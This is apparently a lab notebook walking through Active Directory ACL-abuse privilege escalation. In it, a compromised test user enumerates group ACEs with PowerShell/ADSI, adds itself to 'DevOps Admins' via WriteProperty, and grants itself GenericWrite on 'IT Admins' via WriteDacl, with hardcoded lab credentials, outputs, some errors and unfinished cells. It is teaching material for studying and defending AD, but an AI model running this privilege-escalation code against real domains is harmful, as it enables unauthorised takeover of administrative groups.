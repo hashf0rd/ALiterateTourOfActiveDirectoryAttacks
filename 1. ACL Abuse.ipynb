{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "vscode": {
     "languageId": "powershell"
    }
   },
   "source": [
    "# ACL Overview\n",
    "In the Windows operating system, everything is an object - that is, everything is represented by data structures in memory, that contain members that describe the nature of the data the structure is meant to represent. Obvious things such as files and registry keys are objects, but also more abstract things such as processes and threads are also objects.\n",
    "\n",
    "Active Directory is no different - AD is primarily a database of components that represent the various identities and relationships in a Windows network. Each object or component in an AD environment is a user, a group, a computer, a printer, a service account, or even a container for any of these.\n",
    "\n",
    "Again, as in the Windows operating system, Active Directory objects control who has access via Access Control Lists or ACLs (specifically the **D**iscretionary **A**ccess **C**ontrol List or _DACL_), with each Access Control Entry (or ACE) in the ACL specifying an identity (formally called a security principal) and what specific access rights that identity can excise on the object.\n",
    "\n",
    "Access rights are incredibly powerful - the demonstration below is not exhaustive, but it will be become apparent how destructive a misconfiured ACE on the wrong object can be. Notably however, many of the attacks that are enabled by misconfigured access rights are detailed in their own notebooks, making understanding what objects have rights over other objects one of the fundamental tasks in reconaissance, and in understanding the attack paths through an AD environment.  \n",
    "\n",
    "This lab however will focus on an attack path that relies entirely on misconfigured ACLs. While this is a contrived example, it will demonstrate how these attacks paths work, and lay important foundations for other labs. If you skip any lab, do not skip this one!\n",
    "\n",
    "For this lab, we will assume we have access to the account of a user called \"John Dee\" by some initial access technique."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mdistinguishedName : \u001b[0m{DC=aclabuse,DC=lab}\n",
      "\u001b[32;1mPath              : \u001b[0mLDAP://dc01.aclabuse.lab\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$domainController = \"dc01.aclabuse.lab\"\n",
    "$userName = \"john.dee\"\n",
    "$creds = \"johnsPass01\"\n",
    "$domainName = \"aclabuse.lab\"\n",
    "$domain = New-Object DirectoryServices.DirectoryEntry(\"LDAP://$domainController\",\"$domainName\\$userName\", $creds)\n",
    "$domain"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Looks like the creds work. The above .NET type `DirectoryEntry` retrieves an entry in the AD directory as the name suggests. We are using the [ADSI interface](https://learn.microsoft.com/en-us/windows/win32/adsi/using-adsi) for these calls as the machine this notebook is running on will not be joined to the lab domain. The `DirectoryEntry` object which we are storing in the `$domain` variable is [being constructed](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry.-ctor?view=net-8.0#system-directoryservices-directoryentry-ctor(system-string-system-string-system-string-system-directoryservices-authenticationtypes)) using the path to the _RootDSE_, which is the Root object of the entire Directory. The RootDSE sits on a directory server, so we supply it wih the FQDN of the domain controller (the DS for this lab).\n",
    "\n",
    "Now, we will construct a `DirectorySearcher` object - think of it as a pointer or cursor which we use to traverse the directory and look for objects. Lets examine the account we have creds for in more detail, by setting the _filter_ on the searcher. This uses LDAP filter syntax, which is somewhat idiosyncratic. As you can see, looks like John is in the group __Office Admins__. Maybe an HR function of some kind? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DN: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Groups: CN=DevOps Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab CN=IT Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)\n",
    "$searcher.Filter = \"(&(objectClass=user)(samAccountName=$userName))\"\n",
    "$userObj = $searcher.FindOne()\n",
    "\"DN: $($userObj.Properties.distinguishedname)\"\n",
    "\"Groups: $($userObj.Properties.memberof)\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We will use the original domain object we retrieved and look at the immediate children of this node of the directory, namely, the organisational units. We need the LDAP path specifically."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mdistinguishedName : \u001b[0m{OU=Domain Controllers,DC=aclabuse,DC=lab}\n",
      "\u001b[32;1mPath              : \u001b[0mLDAP://dc01.aclabuse.lab/OU=Domain Controllers,DC=aclabuse,DC=lab\n",
      "\n",
      "\u001b[32;1mdistinguishedName : \u001b[0m{OU=EnterpriseUsers,DC=aclabuse,DC=lab}\n",
      "\u001b[32;1mPath              : \u001b[0mLDAP://dc01.aclabuse.lab/OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$domain.Children | Where-Object { $_.schemaclassname -eq \"organizationalunit\" }"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Using this we can reset the search root of our searcher object, and make our LDAP searches more efficient(as we are not having to traverse the entire directory now - we are starting from the _EnterpriseUsers_ OU."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mdistinguishedName : \u001b[0m{OU=EnterpriseUsers,DC=aclabuse,DC=lab}\n",
      "\u001b[32;1mPath              : \u001b[0mLDAP://dc01.aclabuse.lab/OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry(\"LDAP://$domainController/OU=EnterpriseUsers,DC=aclabuse,DC=lab\",\"$domainName\\$userName\", $creds)\n",
    "$searcher.SearchRoot"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets examine the properties of the Office Admins group briefly."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mName                          \u001b[0m\u001b[32;1m Value\u001b[0m\n",
      "\u001b[32;1m----                          \u001b[0m \u001b[32;1m-----\u001b[0m\n",
      "objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 123 169 28 187 63 46 163 189 100 166 117 …\n",
      "objectcategory                 {CN=Group,CN=Schema,CN=Configuration,DC=aclabuse,DC=lab}\n",
      "dscorepropagationdata          {1/1/1601 12:00:00 AM}\n",
      "whencreated                    {11/7/2024 3:13:34 PM}\n",
      "objectguid                     {148 206 162 26 215 185 232 77 163 118 47 54 177 137 199 108}\n",
      "samaccounttype                 {268435456}\n",
      "grouptype                      {-2147483646}\n",
      "distinguishedname              {CN=Office Admins,OU=EnterpriseUsers,DC=aclabuse,DC=lab}\n",
      "whenchanged                    {11/7/2024 3:13:34 PM}\n",
      "samaccountname                 {Office Admins}\n",
      "usnchanged                     {12661}\n",
      "cn                             {Office Admins}\n",
      "name                           {Office Admins}\n",
      "instancetype                   {4}\n",
      "member                         {CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab}\n",
      "adspath                        {LDAP://dc01.aclabuse.lab/CN=Office Admins,OU=EnterpriseUsers,DC=ac…\n",
      "usncreated                     {12649}\n",
      "objectclass                    {top, group}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=Office Admins))\"\n",
    "$officeAdminsObj = $searcher.FindOne()\n",
    "$officeAdminsObj | Select-Object -ExpandProperty Properties"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see the members only include John (this is a contrived lab after all). Notice that the SID of the group is in a binary format however. We need the SID for the next step, so we will construct a `SecurityIdentifier` object out of this binary SID, in order to convert it to the more recognisable."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mBinaryLength\u001b[0m\u001b[32;1m AccountDomainSid                        \u001b[0m\u001b[32;1m Value\u001b[0m\n",
      "\u001b[32;1m------------\u001b[0m \u001b[32;1m----------------                        \u001b[0m \u001b[32;1m-----\u001b[0m\n",
      "          28 S-1-5-21-3139217787-3181588031-695576164 S-1-5-21-3139217787-3181588031-695576164-1105\n",
      "\n"
     ]
    }
   ],
   "source": [
    "$officeAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$officeAdminsObj.Properties.objectsid[0],0))\n",
    "$officeAdminsSID"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now for some actual recon. Lets look at what other groups the Office Admins group has rights on. As before we set the LDAP filter, this time to look for any groups with _admin_ in the name. Then, we iterate through the groups, examining the ACLs for the group as we go and highlighting any ACEs that contain the SID of the Office Admins group. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== DevOps Admins ===\n",
      "WriteProperty: Allow\n"
     ]
    }
   ],
   "source": [
    "function scout-adminACL {\n",
    "    param (\n",
    "    [Parameter(Mandatory=$true)]\n",
    "    [string]$targetSID\n",
    "    )\n",
    "\n",
    "    # Filter for admin groups\n",
    "    $searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=*admin*))\"\n",
    "\n",
    "    # Retrieve all the directory entries that match the above filter\n",
    "    $groups = $searcher.FindAll()\n",
    "\n",
    "    foreach ($group in $groups) {\n",
    "        \n",
    "        # Get the common name of the group\n",
    "        $groupName = $group.Properties[\"cn\"][0]\n",
    "        \n",
    "        # Get the DACL of the group\n",
    "        $groupEntry = $group.GetDirectoryEntry()\n",
    "        $groupACL = $groupEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])\n",
    "        \n",
    "        # Go through the ACL entries and check if the IdentityReference matches the SID of the Office Admins group\n",
    "        foreach ($ace in $groupACL) {\n",
    "            if ($ace.IdentityReference.CompareTo($targetSID) -eq 0) {\n",
    "                Write-Host \"=== $groupName ===\"\n",
    "                Write-Host \"$($ace.ActiveDirectoryRights): $($ace.AccessControlType)\"\n",
    "            }\n",
    "        }\n",
    "    }\n",
    "}\n",
    "\n",
    "scout-adminACL($officeAdminsSID)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bingo. But what can we do with this right?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteProperty\n",
    "This right, as the name implies, grants a principal the capability to modify properties on another object. If we had `WriteProperty` on the _Domain Admins_ group, we could simply modify the _members_ property and add ourselves to that group, for example. Not so lucky this time, but we do have this right over the _DevOps Admins_ group. We will use this to add our compromised user to the _DevOps Admins_ group.\n",
    "\n",
    "Although this notebook is not a tutorial on the ADSI interface to AD, some comments on how it works will be helpful. The"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Original Members: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "\u001b[31;1mMethodInvocationException: \u001b[0m\n",
      "\u001b[31;1m\u001b[36;1mLine |\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m   5 | \u001b[0m \u001b[36;1m$devopsAdminsEntry.Add($userObj.GetDirectoryEntry().Path)\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m     | \u001b[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[31;1m\u001b[31;1m\u001b[36;1m     | \u001b[31;1mException calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\"\u001b[0m\n",
      "Current Members: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    },
    {
     "ename": "Error",
     "evalue": "Exception calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\"",
     "output_type": "error",
     "traceback": [
      "Exception calling \"Add\" with \"1\" argument(s): \"The object already exists. (0x80071392)\""
     ]
    }
   ],
   "source": [
    "$searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=DevOps Admins))\"\n",
    "$devopsAdminsEntry = $searcher.FindOne().GetDirectoryEntry()\n",
    "\"Original Members: $($devopsAdminsEntry.Properties['member'])\"\n",
    "\n",
    "$devopsAdminsEntry.Add($userObj.GetDirectoryEntry().Path)\n",
    "$devopsAdminsEntry.RefreshCache()\n",
    "#$devopsAdminsEntry = $searcher.FindOne().GetDirectoryEntry()\n",
    "\"Current Members: $($devopsAdminsEntry.Properties['member'])\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## WriteDACL"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== IT Admins ===\n",
      "WriteDacl: Allow\n"
     ]
    }
   ],
   "source": [
    "$searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=DevOps Admins))\"\n",
    "$devopsAdminsObj = $searcher.FindOne()\n",
    "$devopsAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$devopsAdminsObj.Properties.objectsid[0],0))\n",
    "scout-adminACL($devopsAdminsSID)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$userSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$userObj.Properties.objectsid[0],0))\n",
    "$searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=IT Admins))\"\n",
    "$ITAdminsObj = $searcher.FindOne()\n",
    "$ITAdminsEntry = $ITAdminsObj.GetDirectoryEntry()\n",
    "$ITAdminsEntry.PsBase.Options.SecurityMasks = 'DACL'\n",
    "$ITAdminsEntry.PsBase.ObjectSecurity.AddAccessRule(\n",
    "    (New-Object System.DirectoryServices.ActiveDirectoryAccessRule(\n",
    "        ([System.Security.Principal.IdentityReference]([System.Security.Principal.SecurityIdentifier]$userSID)), \n",
    "        ([System.DirectoryServices.ActiveDirectoryRights]'GenericWrite'),\n",
    "        ([System.Security.AccessControl.AccessControlType]'Allow'),\n",
    "        ([System.DirectoryServices.ActiveDirectorySecurityInheritance]'None'))\n",
    "    )\n",
    ")\n",
    "$ITAdminsEntry.PsBase.CommitChanges()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericWrite\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-3139217787-3181588031-695576164-1104\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    }
   ],
   "source": [
    "ForEach ($ACE in $ITAdminsEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "    if ($ACE.IdentityReference.CompareTo($userSID) -eq 0) {\n",
    "        $ACE\n",
    "    }\n",
    "}\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## GenericWrite"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Original Members: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n",
      "Current Members: CN=John Dee,OU=EnterpriseUsers,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "\"Original Members: $($ITAdminsEntry.Properties['member'])\"\n",
    "#$ITAdminsEntry.Add($userObj.GetDirectoryEntry().Path)\n",
    "#$ITAdminsEntry.RefreshCache()\n",
    "\"Current Members: $($ITAdminsEntry.Properties['member'])\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "$ITAdminsSID = (New-Object System.Security.Principal.SecurityIdentifier([Byte[]]$ITAdminsObj.Properties.objectsid[0],0))\n",
    "scout-adminACL($ITAdminsSID)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So what is granting us rights on all these privileged groups?\n",
    "\n",
    "## GenericAll"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[31;1mInvalidOperation: \u001b[0m\n",
      "\u001b[31;1m\u001b[36;1mLine |\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m   2 | \u001b[0m \u001b[36;1m$adminSDEntry = $searcher.FindOne().GetDirectoryEntry()\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m     | \u001b[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[31;1m\u001b[31;1m\u001b[36;1m     | \u001b[31;1mYou cannot call a method on a null-valued expression.\u001b[0m\n",
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericAll\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-3139217787-3181588031-695576164-1106\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    },
    {
     "ename": "Error",
     "evalue": "You cannot call a method on a null-valued expression.",
     "output_type": "error",
     "traceback": [
      "You cannot call a method on a null-valued expression."
     ]
    }
   ],
   "source": [
    "$searcher.Filter = \"(&(cn=AdminSDHolder))\"\n",
    "$adminSDEntry = $searcher.FindOne().GetDirectoryEntry()\n",
    "ForEach ($ACE in $adminSDEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "    if ($ACE.IdentityReference.CompareTo($ITAdminsSID) -eq 0) {\n",
    "        $ACE\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[31;1mInvalidOperation: \u001b[0m\n",
      "\u001b[31;1m\u001b[36;1mLine |\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m   2 | \u001b[0m \u001b[36;1m$domainAdminsEntry = $searcher.FindOne().GetDirectoryEntry()\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m     | \u001b[31;1m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\u001b[0m\n",
      "\u001b[31;1m\u001b[36;1m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[0m\u001b[36;1m\u001b[31;1m\u001b[31;1m\u001b[36;1m     | \u001b[31;1mYou cannot call a method on a null-valued expression.\u001b[0m\n",
      "\n",
      "\u001b[32;1mActiveDirectoryRights : \u001b[0mGenericAll\n",
      "\u001b[32;1mInheritanceType       : \u001b[0mNone\n",
      "\u001b[32;1mObjectType            : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mInheritedObjectType   : \u001b[0m00000000-0000-0000-0000-000000000000\n",
      "\u001b[32;1mObjectFlags           : \u001b[0mNone\n",
      "\u001b[32;1mAccessControlType     : \u001b[0mAllow\n",
      "\u001b[32;1mIdentityReference     : \u001b[0mS-1-5-21-3139217787-3181588031-695576164-1106\n",
      "\u001b[32;1mIsInherited           : \u001b[0mFalse\n",
      "\u001b[32;1mInheritanceFlags      : \u001b[0mNone\n",
      "\u001b[32;1mPropagationFlags      : \u001b[0mNone\n",
      "\n"
     ]
    },
    {
     "ename": "Error",
     "evalue": "You cannot call a method on a null-valued expression.",
     "output_type": "error",
     "traceback": [
      "You cannot call a method on a null-valued expression."
     ]
    }
   ],
   "source": [
    "$searcher.Filter = \"(&(objectCategory=group)(objectClass=group)(cn=Domain Admins))\"\n",
    "$domainAdminsEntry = $searcher.FindOne().GetDirectoryEntry()\n",
    "ForEach ($ACE in $domainAdminsEntry.ObjectSecurity.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {\n",
    "    if ($ACE.IdentityReference.CompareTo($ITAdminsSID) -eq 0) {\n",
    "        $ACE\n",
    "    }\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "top domain domainDNS\n",
      "DC=aclabuse,DC=lab\n",
      "5\n",
      "11/7/2024 3:06:43 PM\n",
      "11/7/2024 4:07:48 PM\n",
      "DC=ForestDnsZones,DC=aclabuse,DC=lab DC=DomainDnsZones,DC=aclabuse,DC=lab CN=Configuration,DC=aclabuse,DC=lab\n",
      "System.__ComObject\n",
      "1 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 175 190 74 109 54 39 167 74 175 56 75 51 157 204 214 54\n",
      "System.__ComObject\n",
      "System.__ComObject\n",
      "aclabuse\n",
      "77 243 174 218 72 124 115 65 173 20 61 154 230 72 6 201\n",
      "System.__ComObject\n",
      "System.__ComObject\n",
      "System.__ComObject\n",
      "System.__ComObject\n",
      "0\n",
      "System.__ComObject\n",
      "System.__ComObject\n",
      "0\n",
      "System.__ComObject\n",
      "1001\n",
      "1\n",
      "0\n",
      "1 4 0 0 0 0 0 5 21 0 0 0 123 169 28 187 63 46 163 189 100 166 117 41\n",
      "1\n",
      "1\n",
      "System.__ComObject\n",
      "0 1\n",
      "0\n",
      "CN=RID Manager$,CN=System,DC=aclabuse,DC=lab\n",
      "CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=aclabuse,DC=lab\n",
      "-1946157056\n",
      "System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject System.__ComObject\n",
      "CN=Domain-DNS,CN=Schema,CN=Configuration,DC=aclabuse,DC=lab\n",
      "True\n",
      "[LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=aclabuse,DC=lab;0]\n",
      "1/1/1601 12:00:00 AM\n",
      "System.__ComObject System.__ComObject\n",
      "CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=aclabuse,DC=lab\n",
      "10\n",
      "7\n",
      "1\n",
      "1000\n",
      "10\n",
      "CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=aclabuse,DC=lab\n",
      "CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=aclabuse,DC=lab\n",
      "0\n",
      "True\n",
      "aclabuse\n"
     ]
    }
   ],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {
    "dotnet_interactive": {
     "language": "pwsh"
    },
    "polyglot_notebook": {
     "kernelName": "pwsh"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CN=aclAdmin,CN=Users,DC=aclabuse,DC=lab\n",
      "CN=Administrator,CN=Users,DC=aclabuse,DC=lab\n"
     ]
    }
   ],
   "source": [
    "$domainAdminsEntry.Properties['member']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Last Words\n",
    "\n",
    "The entire attack path is viewable via bloodhound."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![aclabuse_attack_path](./Images/aclabuse.png)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "name": "csharp"
  },
  "polyglot_notebook": {
   "kernelInfo": {
    "defaultKernelName": "csharp",
    "items": [
     {
      "aliases": [],
      "name": "csharp"
     }
    ]
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
